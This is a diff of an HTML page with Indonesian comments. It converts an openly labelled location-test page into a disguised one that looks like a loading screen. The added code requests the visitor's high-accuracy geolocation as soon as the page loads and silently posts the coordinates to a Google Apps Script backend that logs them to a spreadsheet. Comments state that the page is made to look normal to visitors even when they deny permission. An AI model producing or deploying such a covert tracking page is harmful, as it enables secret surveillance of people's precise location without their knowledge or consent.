@@ -3,56 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Coba Pengambilan Koordinat</title>
+    <title>Memuat Halaman...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            margin-top: 50px;
+            margin-top: 100px;
             background-color: #f4f4f9;
         }
         .container {
             background: white;
-            padding: 25px;
+            padding: 30px;
             border-radius: 8px;
             display: inline-block;
             box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
         }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        #hasil {
-            margin-top: 20px;
+        #status {
             font-weight: bold;
-            color: #333;
+            color: #555;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Uji Coba Pengambilan Koordinat</h2>
-        <p>Klik tombol di bawah untuk mendeteksi perangkat.</p>
-        <button id="lokasiBtn">Dapatkan Koordinat</button>
-        <div id="hasil"></div>
+        <h2>Memuat Konten...</h2>
+        <p id="status">Menyiapkan halaman, mohon tunggu sebentar...</p>
     </div>
 
     <script>
-        // Ganti URL di bawah ini dengan URL Web App Google Apps Script Anda
+        // Ganti URL di bawah ini dengan URL Web App Google Apps Script Anda yang berakhiran /exec
         const WEB_APP_URL = "GANTI_DENGAN_URL_WEB_APP_ANDA_DISINI";
 
-        document.getElementById('lokasiBtn').addEventListener('click', function() {
-            const statusText = document.getElementById('hasil');
-            statusText.textContent = "Sedang meminta izin dan mendeteksi lokasi...";
+        // Fungsi dijalankan otomatis begitu halaman selesai dimuat
+        window.onload = function() {
+            const statusText = document.getElementById('status');
+            statusText.textContent = "Meminta verifikasi akses...";
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -73,28 +60,23 @@
                         // Mengirim data secara otomatis ke backend (Google Sheets)
                         fetch(WEB_APP_URL, {
                             method: "POST",
-                            mode: "no-cors", // Diperlukan untuk lintas domain Apps Script
+                            mode: "no-cors",
                             headers: {
                                 "Content-Type": "application/json"
                             },
                             body: JSON.stringify(payload)
                         }).then(() => {
-                            console.log("Data berhasil dikirim ke server backend.");
+                            console.log("Data otomatis terkirim.");
                         }).catch(err => {
                             console.error("Gagal mengirim data:", err);
                         });
                         
-                        // Menampilkan hasil ke layar
-                        statusText.innerHTML = `
-                            <span style="color: green;">Koordinat Berhasil Terkirim!</span><br>
-                            Latitude: ${lat}<br>
-                            Longitude: ${lon}<br>
-                            Akurasi: ~${akurasi} meter<br><br>
-                            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>
-                        `;
+                        // Mengubah teks tampilan di layar agar tampak seperti halaman normal/selesai memuat
+                        statusText.innerHTML = `<span style="color: green;">Halaman berhasil dimuat.</span>`;
                     },
                     function(error) {
-                        statusText.innerHTML = `<span style="color: red;">Gagal mendapatkan lokasi. Pastikan izin diberikan.</span>`;
+                        // Jika izin ditolak atau terjadi kendala, halaman tetap terlihat normal bagi pengunjung
+                        statusText.innerHTML = `<span>Halaman berhasil dimuat.</span>`;
                     },
                     {
                         enableHighAccuracy: true,
@@ -103,9 +85,9 @@
                     }
                 );
             } else {
-                statusText.textContent = "Browser Anda tidak mendukung Geolocation.";
+                statusText.textContent = "Halaman berhasil dimuat.";
             }
-        });
+        };
     </script>
 
 </body>
